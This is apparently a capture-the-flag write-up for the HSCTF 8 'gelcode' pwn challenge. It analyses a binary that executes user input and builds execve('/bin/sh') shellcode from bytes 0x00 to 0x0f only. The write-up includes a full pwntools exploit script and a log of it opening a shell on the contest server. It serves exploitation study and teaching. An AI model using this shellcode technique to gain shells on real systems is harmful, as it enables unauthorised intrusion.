## gelcode

> Points: 490  
>  
> Solves: 29

### Description:  
```  
Input restrictions are annoying to deal with.

nc gelcode.hsc.tf 1337

```

### Files:  
```  
chal  
```

## Analysis:  
```asm  
$ checksec chal  
[*] '/home/mito/CTF/HSCTF_8/Pwn_gelcode/chal'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

Compile result by Ghidra

```c  
void main(void)  
{  
 code *__ptr;  
 int local_14;  
  
 setvbuf(stdin,(char *)0x0,2,0);  
 setvbuf(stdout,(char *)0x0,2,0);  
 setvbuf(stderr,(char *)0x0,2,0);  
 __ptr = (code *)malloc(1000);  
 mprotect((void *)((ulong)__ptr & 0xfffffffffffff000),0x1000,7);  
 puts("Input, please.");  
 fread(__ptr,1,1000,stdin);  
 local_14 = 0;  
 while (local_14 < 1000) {  
   if (0xf < (byte)__ptr[local_14]) {  
     __ptr[local_14] = (code)0x0;  
   }  
   local_14 = local_14 + 1;  
 }  
 (*__ptr)();  
 free(__ptr);  
                   /* WARNING: Subroutine does not return */  
 exit(0);  
}  
```

memory map  
```asm  
gdb-peda$ vmmap  
Start              End                Perm      Name  
0x0000555555554000 0x0000555555557000 r-xp
/home/mito/CTF/HSCTF_8/Pwn_gelcode/chal  
0x0000555555557000 0x0000555555558000 r-xp
/home/mito/CTF/HSCTF_8/Pwn_gelcode/chal  
0x0000555555558000 0x0000555555559000 rwxp
/home/mito/CTF/HSCTF_8/Pwn_gelcode/chal  
0x0000555555559000 0x000055555557a000 rwxp      [heap]                  <----
shellcode  
0x00007ffff79e2000 0x00007ffff7bc9000 r-xp      /lib/x86_64-linux-
gnu/libc-2.27.so  
0x00007ffff7bc9000 0x00007ffff7dc9000 ---p      /lib/x86_64-linux-
gnu/libc-2.27.so  
0x00007ffff7dc9000 0x00007ffff7dcd000 r-xp      /lib/x86_64-linux-
gnu/libc-2.27.so  
0x00007ffff7dcd000 0x00007ffff7dcf000 rwxp      /lib/x86_64-linux-
gnu/libc-2.27.so  
0x00007ffff7dcf000 0x00007ffff7dd3000 rwxp      mapped  
0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp      /lib/x86_64-linux-
gnu/ld-2.27.so  
0x00007ffff7fd5000 0x00007ffff7fd7000 rwxp      mapped  
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]  
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]  
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp      /lib/x86_64-linux-
gnu/ld-2.27.so  
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp      /lib/x86_64-linux-
gnu/ld-2.27.so  
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp      mapped  
0x00007ffffffde000 0x00007ffffffff000 rwxp      [stack]  
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]  
```

## Solution:

This is a shellcode challenge limited to code from `0x00` to `0x0f`.  
The number of input bytes is `1000` bytes.  
The initial setting at the start of the shellcode is to set the `rax` register
to 0 and the `rdx` register to the start address(heap address=0x555555559260)
of the shellcode.

```asm  
[----------------------------------registers-----------------------------------]  
RAX: 0x0  
RBX: 0x0  
RCX: 0x7ffff7af2151 (<__GI___libc_read+17>:     cmp    rax,0xfffffffffffff000)  
RDX: 0x555555559260 --> 0x0  
RSI: 0x7ffff7dcf8d0 --> 0x0  
RDI: 0x0  
RBP: 0x7fffffffddf0 --> 0x555555555320 (<__libc_csu_init>:      endbr64)  
RSP: 0x7fffffffdde0 --> 0x3e8ffffded0  
RIP: 0x555555555308 (<main+255>:        call   rdx)  
R8 : 0xb40 ('@\x0b')  
R9 : 0x555555559260 --> 0x0  
R10: 0x7ffff7dcf8d0 --> 0x0  
R11: 0x346  
R12: 0x555555555120 (<_start>:  endbr64)  
R13: 0x7fffffffded0 --> 0x1  
R14: 0x0  
R15: 0x0  
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction
overflow)  
[-------------------------------------code-------------------------------------]  
  0x5555555552fd <main+244>:    jle    0x5555555552ce <main+197>  
  0x5555555552ff <main+246>:    mov    rdx,QWORD PTR [rbp-0x8]  
  0x555555555303 <main+250>:    mov    eax,0x0  
=> 0x555555555308 <main+255>:   call   rdx  
  0x55555555530a <main+257>:    mov    rax,QWORD PTR [rbp-0x8]  
  0x55555555530e <main+261>:    mov    rdi,rax  
  0x555555555311 <main+264>:    call   0x5555555550b0 <free@plt>  
  0x555555555316 <main+269>:    mov    edi,0x0  
No argument  
[------------------------------------stack-------------------------------------]  
```

I checked the available `amd64` instructions using the following command of
pwntools.  
I found that only `add` and `or` instructions are possible.

```asm  
$ disasm -c amd64 "000000000000"  
  0:    00 00                    add    BYTE PTR [rax],  al  
  2:    00 00                    add    BYTE PTR [rax],  al  
```

I found that I could create an arbitrary instruction code by using the
instruction below.  
First I wrote the code (`xor ecx, ecx`) to set the rcx register to 0.  
```asm  
add al, 0x01  
add BYTE PTR [rdx+rax*1], al  
add BYTE PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add ecx, DWORD PTR [rip+0x30f]  
```

I set `0x01` to the address of `rdx (0x555555559260)` to use the following
instructions(for rcx increment).  
```asm  
add cl, byte PTR [rdx]  
```

Finally, I created the following shellcode in heap memory.

```asm  
=> 0x0000555555559460:  push   rdx  
  0x0000555555559461:   pop    rdi  
  0x0000555555559462:   add    rdi,0x30f  
  0x0000555555559469:   xor    esi,esi  
  0x000055555555946b:   xor    edx,edx  
  0x000055555555946d:   push   0x3b  
  0x000055555555946f:   pop    rax  
  0x0000555555559470:   syscal  
```

## Exploit code:  
```python  
from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './chal'  
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 HOST = "gelcode.hsc.tf"  
 PORT = 1337  
 s = remote(HOST, PORT)  
else:  
 s = process(BINARY)

# set 0x555555559260 = 0x01  for rcx increment  
buf = asm('''  
add DWORD PTR [rip+0x600], eax  
''')

# make xor ecx,ecx   code 0x31c9  
buf += asm('''  
add al, 0x0d  
add al, 0x0d  
add al, 0x0d  
add BYTE PTR [rdx+rax*1], al  
add al, 0x01  
add BYTE PTR [rdx+rax*1], al  
add BYTE PTR [rdx+rax*1], al  
add BYTE PTR [rdx+rax*1], al  
add BYTE PTR [rdx+rax*1], al  
add BYTE PTR [rdx+rax*1], al  
''')

# padding  
buf += asm('''  
add cl,  BYTE PTR [rdx]  
add cl,  BYTE PTR [rdx]  
add cl,  BYTE PTR [rdx+rax*1]  
''')  
buf += "\x00"*(0x27-len(buf))  
buf += "\x0a\x01"

# rcx = 0x200  
buf += asm('''  
add ecx, DWORD PTR [rip+0x30f]  
''')

# push rdx   # 0x52  
buf += asm('''  
add al, 1  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
''')

# pop rdi    # 0x5f  
buf += asm('''  
add cl, byte PTR [rdx]  
add al, 6  
add byte PTR [rdx+rcx*1], al  
add al, 1  
add byte PTR [rdx+rcx*1], al  
''')  
# al = 0x30  
# add rdi, 0x30f  # 4881c70f030000  
buf += asm('''  
add cl, byte PTR [rdx]  
add al, 0xf  
add al, 1  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add cl, byte PTR [rdx]  
add cl, byte PTR [rdx]  
add cl, byte PTR [rdx]  
''')  
# al = 0x40

# xor esi, esi  # 0x31f6  
buf += asm('''  
add cl, byte PTR [rdx]  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
''')  
# al = 0x30

# xor edx, edx  # 0x31d2  
buf += asm('''  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add al, 1  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
''')  
# al = 0x31

# push 0x3b  # 0x6a3b  
buf += asm('''  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
''')  
# al = 0x31

# pop rax  # 0x58  
buf += asm('''  
add cl, byte PTR [rdx]  
add al, 0xf  
add al, 0xf  
add al, 0x9  
add byte PTR [rdx+rcx*1], al  
''')  
# al = 0x58

# make /bin/sh

# rcx = 0x200  
buf += asm('''  
add ecx, DWORD PTR [rip+0x20f]  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0xf  
add al, 0x5  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add al, 2  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add cl, byte PTR [rdx]  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
add byte PTR [rdx+rcx*1], al  
''')

# padding  
buf += asm('''  
add cl,  BYTE PTR [rdx]  
''')*((0x200-len(buf))/2-1)  
buf += asm('''  
add cl, byte PTR [rdx+rax*1]  
''')

buf +=
"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"

buf += "\x00"*(0x2df-len(buf))  
buf += "\x00\x01"  # rcx = 0x30f

buf += "\x00"*(0x30f-len(buf))  
buf += "\x0f\x02\x09\x0e\x0f\x0d\x02"  # /bin/sh

buf += "\x00"*(0x30f+0x2f-len(buf))  
buf += "\x00\x02"  # rcx = 0x200

buf += "\x00"*(1000-len(buf))  
s.sendline(buf)

s.interactive()  
```

## Results:  
```bash  
mito@ubuntu:~/CTF/HSCTF_8/Pwn_gelcode$ python solve.py r  
[*] '/home/mito/CTF/HSCTF_8/Pwn_gelcode/chal'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to gelcode.hsc.tf on port 1337: Done  
[*] Paused (press any to continue)  
[*] Switching to interactive mode  
== proof-of-work: disabled ==  
Input, please.  
$ id  
uid=1000(user) gid=1000(user) groups=1000(user)  
$ cat flag  
flag{bell_code_noughttwoeff}

```

Original writeup
(https://github.com/mito753/CTF/tree/main/2021/HSCTF_8/Pwn_gelcode).